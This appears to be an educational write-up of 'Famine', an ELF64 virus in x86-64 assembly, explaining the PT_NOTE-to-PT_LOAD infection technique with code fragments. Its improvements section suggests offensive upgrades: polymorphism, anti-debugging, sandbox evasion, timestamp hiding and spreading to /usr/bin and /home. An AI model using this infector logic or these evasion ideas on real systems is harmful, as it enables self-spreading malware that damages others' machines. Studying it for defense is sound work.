# Famine Virus - Algorithm Presentation

## Introduction

**Famine** is an educational ELF64 binary infector written in x86-64 assembly (NASM). This document provides a comprehensive explanation of the virus algorithm, key concepts, tricky implementation details, and potential improvements.

> ⚠️ **Disclaimer**: This project is for **educational purposes only**. Understanding virus techniques helps security professionals develop better defenses. Never use these techniques for malicious purposes.

---

## Table of Contents

1. [High-Level Algorithm Overview](#high-level-algorithm-overview)
2. [Program Architecture](#program-architecture)
3. [Key Concepts](#key-concepts)
4. [The Infection Process](#the-infection-process)
5. [Tricky Parts: Relative Addressing](#tricky-parts-relative-addressing)
6. [Code Walkthrough](#code-walkthrough)
7. [Potential Improvements](#potential-improvements)
8. [Conclusion](#conclusion)

---

## High-Level Algorithm Overview

The Famine virus operates in four main phases:

```
┌─────────────────────────────────────────────────────────────┐
│                     FAMINE ALGORITHM                        │
├─────────────────────────────────────────────────────────────┤
│  1. DIRECTORY SCANNING                                      │
│     └── Recursively scan /tmp/test for all files            │
│                                                             │
│  2. FILE CLASSIFICATION                                     │
│     └── Identify ELF64 executables vs other files           │
│                                                             │
│  3. INFECTION                                               │
│     ├── ELF64: Modify PT_NOTE → PT_LOAD segment             │
│     └── Non-ELF: Append signature (marker)                  │
│                                                             │
│  4. SIGNATURE CHECK                                         │
│     └── Skip already infected files                         │
└─────────────────────────────────────────────────────────────┘
```

---

## Program Architecture

### File Structure

```
sources/
├── main.s              # Entry point, main logic, infection routines
├── utils.s             # String utilities (print, copy, search)
├── check_elf_64_exec.s # ELF validation and file classification
└── list_files_recursive.s # Directory traversal

includes/
└── include.s           # Constants, syscalls, ELF structures
```

### Data Flow

```
                    ┌──────────────┐
                    │   _start     │
                    └──────┬───────┘
                           │
                           ▼
              ┌────────────────────────┐
              │ list_files_recursive() │
              │  Scan /tmp/test        │
              └───────────┬────────────┘
                          │
                          ▼
              ┌────────────────────────┐
              │   check_elf64_exec()   │
              │  For each file...      │
              └───────────┬────────────┘
                          │
            ┌─────────────┴─────────────┐
            │                           │
            ▼                           ▼
   ┌─────────────────┐        ┌──────────────────────┐
   │  Valid ELF64?   │        │    Non-ELF file      │
   │  add_pt_load()  │        │ process_non_elf()    │
   └─────────────────┘        └──────────────────────┘
```

---

## Key Concepts

### 1. ELF64 File Format

The **Executable and Linkable Format (ELF)** is the standard binary format on Linux. Understanding its structure is crucial for binary infection.

#### ELF Header (64 bytes)

```
Offset  Size  Field           Description
──────────────────────────────────────────────────────
0x00    16    e_ident         Magic number + metadata
0x10    2     e_type          Object type (ET_EXEC=2, ET_DYN=3)
0x12    2     e_machine       Architecture
0x14    4     e_version       ELF version
0x18    8     e_entry         Entry point address ← IMPORTANT
0x20    8     e_phoff         Program header offset
0x28    8     e_shoff         Section header offset
0x30    4     e_flags         Processor flags
0x34    2     e_ehsize        ELF header size
0x36    2     e_phentsize     Program header entry size
0x38    2     e_phnum         Number of program headers
0x3A    2     e_shentsize     Section header entry size
0x3C    2     e_shnum         Section header count
0x3E    2     e_shstrndx      Section name string table index
──────────────────────────────────────────────────────
Total: 64 bytes (0x40)
```

#### Magic Number Check

```nasm
; Check ELF magic: 0x7f 'E' 'L' 'F'
cmp byte [rdi + 0], 0x7f
cmp byte [rdi + 1], 'E'
cmp byte [rdi + 2], 'L'
cmp byte [rdi + 3], 'F'
```

### 2. Program Headers (Segments)

Program headers describe memory segments that the loader uses:

```
Offset  Size  Field       Description
────────────────────────────────────────
0x00    4     p_type      Segment type
0x04    4     p_flags     Permissions (R/W/X)
0x08    8     p_offset    File offset
0x10    8     p_vaddr     Virtual address
0x18    8     p_paddr     Physical address
0x20    8     p_filesz    Size in file
0x28    8     p_memsz     Size in memory
0x30    8     p_align     Alignment
```

#### Segment Types

| Type    | Value | Description |
|---------|-------|-------------|
| PT_NULL | 0     | Unused entry |
| PT_LOAD | 1     | Loadable segment |
| PT_NOTE | 4     | Auxiliary information |

### 3. The PT_NOTE → PT_LOAD Technique

This is the core infection technique. The idea:

1. **Find a PT_NOTE segment** (contains auxiliary info, often non-essential)
2. **Convert it to PT_LOAD** (loadable code segment)
3. **Point it to appended virus code** at the end of the file
4. **Modify entry point** to jump to virus code

```
BEFORE INFECTION:
┌──────────────────────────────────────┐
│ ELF Header                           │
│   e_entry → 0x401000 (original)      │
├──────────────────────────────────────┤
│ Program Headers                      │
│   PT_LOAD (code)                     │
│   PT_LOAD (data)                     │
│   PT_NOTE (notes) ← TARGET           │
├──────────────────────────────────────┤
│ Original Code                        │
└──────────────────────────────────────┘

AFTER INFECTION:
┌──────────────────────────────────────┐
│ ELF Header                           │
│   e_entry → 0xC001000 (virus)        │
├──────────────────────────────────────┤
│ Program Headers                      │
│   PT_LOAD (code)                     │
│   PT_LOAD (data)                     │
│   PT_LOAD (virus) ← CONVERTED        │
├──────────────────────────────────────┤
│ Original Code                        │
├──────────────────────────────────────┤
│ VIRUS CODE (appended)                │
│   - Execute payload                  │
│   - Jump to original entry           │
└──────────────────────────────────────┘
```

### 4. Linux System Calls

The virus uses raw syscalls to avoid library dependencies:

| Syscall     | Number | Purpose |
|-------------|--------|---------|
| SYS_READ    | 0      | Read file content |
| SYS_WRITE   | 1      | Write to file/stdout |
| SYS_OPENAT  | 257    | Open file/directory |
| SYS_CLOSE   | 3      | Close file descriptor |
| SYS_LSEEK   | 8      | Seek within file |
| SYS_GETDENTS64 | 217 | Read directory entries |

---

## The Infection Process

### Step 1: Directory Traversal

```nasm
list_files_recursive:
    ; Open directory with O_RDONLY | O_DIRECTORY
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r12                ; path
    mov edx, O_RDONLY_DIR
    syscall
    
    ; Read entries with getdents64
    mov eax, SYS_GETDENTS64
    mov edi, r13d               ; fd
    lea rsi, [rbp - BUFFER_SIZE - STACK_LOCALS]
    mov edx, BUFFER_SIZE
    syscall
```

The `linux_dirent64` structure:
```
struct linux_dirent64 {
    u64  d_ino;      // inode number
    u64  d_off;      // offset to next
    u16  d_reclen;   // record length
    u8   d_type;     // file type (DT_REG=8, DT_DIR=4)
    char d_name[];   // filename (variable length)
};
```

### Step 2: ELF Validation

```nasm
check_elf64_exec:
    ; Read 64-byte ELF header
    mov eax, SYS_READ
    mov edi, ebx
    lea rsi, [rel elf_header_buf]
    mov edx, 64
    syscall
    
    ; Validate magic number
    cmp byte [rdi + 0], 0x7f    ; ELF magic
    cmp byte [rdi + 1], 'E'
    cmp byte [rdi + 2], 'L'
    cmp byte [rdi + 3], 'F'
    
    ; Check 64-bit class
    cmp byte [rdi + 4], 2       ; ELFCLASS64
    
    ; Check executable type
    movzx eax, word [rdi + 16]  ; e_type
    cmp ax, 2                   ; ET_EXEC
    cmp ax, 3                   ; ET_DYN (PIE)
```

### Step 3: PT_NOTE to PT_LOAD Conversion

```nasm
add_pt_load:
    ; Find PT_NOTE segment
.find_note_loop:
    cmp dword [rsi + p_type], PT_NOTE  ; is it PT_NOTE (4)?
    je .found_note
    
.found_note:
    ; Convert to PT_LOAD
    mov dword [rdi + p_type], PT_LOAD      ; Change type to 1
    mov dword [rdi + p_flags], PF_R|PF_W|PF_X  ; RWX permissions
    mov qword [rdi + p_offset], file_size  ; Point to EOF
    mov qword [rdi + p_vaddr], 0xC000000 + aligned_offset
    mov qword [rdi + p_filesz], 0x1000
    mov qword [rdi + p_memsz], 0x1000
    mov qword [rdi + p_align], 0x1000
```

### Step 4: Signature-Based Infection Prevention

```nasm
search_substring:
    ; Search for "Famine version 1.0..." signature
    ; Returns 1 if found (already infected)
    ; Returns 0 if not found (can infect)
```

---

## Tricky Parts: Relative Addressing

### The Position-Independent Code Challenge

**Problem**: When virus code runs in an infected binary, it doesn't know its own location in memory. Absolute addresses would be wrong!

**Solution**: Use **RIP-relative addressing** (x86-64 feature)

### Understanding RIP-Relative Addressing

```nasm
; WRONG: Absolute addressing (won't work after injection)
mov rax, [absolute_address]     ; Address hardcoded at assembly time

; RIGHT: RIP-relative addressing (position-independent)
lea rax, [rel my_variable]      ; Address calculated at runtime
mov rax, [rel my_variable]      ; Same concept for memory access
```

### How `[rel X]` Works

```
┌────────────────────────────────────────────────────────────┐
│  Instruction:  lea rax, [rel signature]                    │
│                                                            │
│  At assembly time:                                         │
│    - Assembler calculates: offset = signature - (RIP + 7)  │
│    - This offset is encoded in the instruction             │
│                                                            │
│  At runtime:                                               │
│    - CPU adds current RIP + offset                         │
│    - Result: actual address of signature                   │
│                                                            │
│  This works regardless of where code is loaded!            │
└────────────────────────────────────────────────────────────┘
```

### Example from the Code

```nasm
; In main.s - accessing data relatively
mov qword [rel file_count], 0   ; Store 0 at file_count
lea rdi, [rel path_buffer]      ; Get address of path_buffer
lea rdi, [rel signature]        ; Get address of signature string
```

### The Delta Technique (Classic Approach)

Some viruses use a "delta offset" to achieve position independence:

```nasm
virus_start:
    call get_delta
get_delta:
    pop rbx                     ; RBX = address of get_delta
    sub rbx, get_delta - virus_start  ; RBX = virus_start address
    
    ; Now access data as: [rbx + (data - virus_start)]
    lea rax, [rbx + signature - virus_start]
```

The `[rel X]` syntax in NASM is cleaner but achieves the same goal.

### Why This Matters for Virus Code

```
Original Binary (compiled at 0x401000):
┌─────────────────────┐
│ Code at 0x401000    │
│ Data at 0x402000    │  ← Absolute refs work here
└─────────────────────┘

Infected Binary (virus at 0xC001000):
┌─────────────────────┐
│ Original code       │
├─────────────────────┤
│ Virus at 0xC001000  │  ← But virus was assembled
│ Virus data nearby   │     assuming different addresses!
└─────────────────────┘

Solution: All virus code uses relative addressing
```

---

## Code Walkthrough

### Entry Point (_start)

```nasm
_start:
    ; Initialize counter
    mov qword [rel file_count], 0
    
    ; Set up path buffer with "/tmp/test"
    mov rsi, firstDir
    lea rdi, [rel path_buffer]
    call str_copy
    
    ; Scan directory recursively
    lea rdi, [rel path_buffer]
    call list_files_recursive
    
    ; Process all found files
    lea rdi, [rel file_list]
    mov rsi, [rel file_count]
    call check_elf64_exec
    
    jmp _end
```

### Stack Frame Management

Notice the careful stack management:

```nasm
add_pt_load:
    push rbp
    mov rbp, rsp
    sub rsp, 32                 ; Local variables
    push r12                    ; Callee-saved registers
    push r13
    push r14
    push r15
    push rbx
    
    ; ... function body ...
    
    pop rbx                     ; Restore in reverse order
    pop r15
    pop r14
    pop r13
    pop r12
    add rsp, 32
    mov rsp, rbp
    pop rbp
    ret
```

### Virtual Address Calculation

```nasm
    ; Calculate aligned virtual address for new segment
    mov rcx, rax                ; file size
    add rcx, 0xfff              ; Round up...
    and rcx, ~0xfff             ; ...to page boundary (4KB)
    add rcx, 0xc000000          ; Add high base address
    mov qword [rdi + p_vaddr], rcx
```

This ensures:
1. The virus segment starts at a page-aligned address
2. It's in a high memory region that won't conflict with existing segments

---

## Potential Improvements

### 1. Stealth Improvements

#### a) Hide the Signature
Currently uses a plaintext signature:
```nasm
signature: db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>", 0
```

**Improvement**: XOR-encode the signature:
```nasm
; Encoded signature (XOR with 0x42)
encoded_sig: db 0x24, 0x63, 0x6f, ...  ; XOR'd bytes

decode_signature:
    mov rcx, signature_len
    lea rsi, [rel encoded_sig]
.loop:
    xor byte [rsi], 0x42
    inc rsi
    loop .loop
```

#### b) Polymorphic Code
Insert random NOPs or equivalent instructions to change the virus's byte pattern:
```nasm
; Functionally equivalent to NOP
xchg rax, rax
lea rax, [rax]
mov rax, rax
```

#### c) Metamorphic Engine
Rewrite virus code using different instruction sequences:
```nasm
; Original
mov rax, 0
; Equivalent
xor rax, rax
; Equivalent
sub rax, rax
```

### 2. Entry Point Hijacking

Currently modifies PT_NOTE → PT_LOAD but doesn't update entry point. To execute virus code:

```nasm
; Save original entry point
mov rax, [rdi + e_entry]
mov [rel original_entry], rax

; Set new entry point to virus
mov rax, virus_vaddr
mov [rdi + e_entry], rax

; At end of virus code, jump back
virus_end:
    mov rax, [rel original_entry]
    jmp rax
```

### 3. Avoid Detection

#### a) File Timestamp Preservation
```nasm
; Get original timestamps before modification
mov eax, SYS_FSTAT
; ... save timestamps ...

; After modification, restore them
mov eax, SYS_UTIMENSAT
; ... restore timestamps ...
```

#### b) Preserve File Size (Cavity Infection)
Instead of appending, find unused space in the binary:
- Look for large runs of zeros in code caves
- Use slack space at end of sections

#### c) Anti-Debugging
```nasm
; Check if being traced
mov eax, SYS_PTRACE
mov edi, PTRACE_TRACEME
xor esi, esi
xor edx, edx
xor r10d, r10d
syscall
test rax, rax
jnz being_debugged
```

### 4. Infection Spread Improvements

#### a) Target More Directories
```nasm
; Current: only /tmp/test
firstDir: db "/tmp/test", 0

; Improved: multiple targets
targets:
    dq dir1, dir2, dir3, 0
dir1: db "/usr/bin", 0
dir2: db "/usr/local/bin", 0  
dir3: db "/home", 0
```

#### b) Cross-Process Infection
- Memory-resident techniques
- Hook system calls
- Infect binaries as they're loaded

### 5. Code Quality Improvements

#### a) Error Handling
```nasm
; Currently, many error paths just fall through
; Add proper error recovery:
.error:
    mov rdi, error_msg
    call print_string
    mov eax, SYS_EXIT
    mov edi, 1
    syscall
```

#### b) Bounds Checking
```nasm
; Check buffer limits before operations
cmp rax, BUFFER_SIZE
jge .overflow_error
```

### 6. Evasion Techniques

#### a) Execute Only at Certain Times
```nasm
; Get current time
mov eax, SYS_TIME
; Only infect on certain days/hours
```

#### b) Check Environment
```nasm
; Skip if in a VM or sandbox
; Check for VM artifacts in /proc/cpuinfo
; Check for sandbox-specific files
```

---

## Conclusion

### Summary

The Famine virus demonstrates several key concepts in binary infection:

1. **ELF Structure Manipulation**: Understanding and modifying program headers
2. **Syscall-Based I/O**: Direct kernel interaction without libc
3. **Position-Independent Code**: Using RIP-relative addressing
4. **Recursive File Processing**: Traversing directory structures
5. **Signature-Based Detection Prevention**: Avoiding re-infection

### Key Takeaways

| Concept | Why It Matters |
|---------|----------------|
| PT_NOTE → PT_LOAD | Hijack unused segment without breaking binary |
| RIP-relative addressing | Code works regardless of load address |
| Raw syscalls | No library dependencies, harder to trace |
| Signature checking | Prevent infinite re-infection |

### Defense Strategies

Understanding virus techniques helps defenders:

1. **File Integrity Monitoring**: Detect modified binaries
2. **Behavioral Analysis**: Watch for suspicious syscall patterns
3. **Memory Protection**: Enforce W^X (Write XOR Execute)
4. **Static Analysis**: Scan for known signatures and patterns

---

## Appendix: Building and Testing

### Build the Virus
```bash
make
# Produces: ./Famine
```

### Test Environment Setup
```bash
# Create test directory
mkdir -p /tmp/test
cp /bin/ls /tmp/test/
echo "test file" > /tmp/test/test.txt
```

### Run
```bash
./Famine
```

### Examine Infected Binary
```bash
readelf -l /tmp/test/ls  # Check program headers
objdump -d /tmp/test/ls  # Disassemble
```

---

*This document is for educational purposes in a cybersecurity context.*
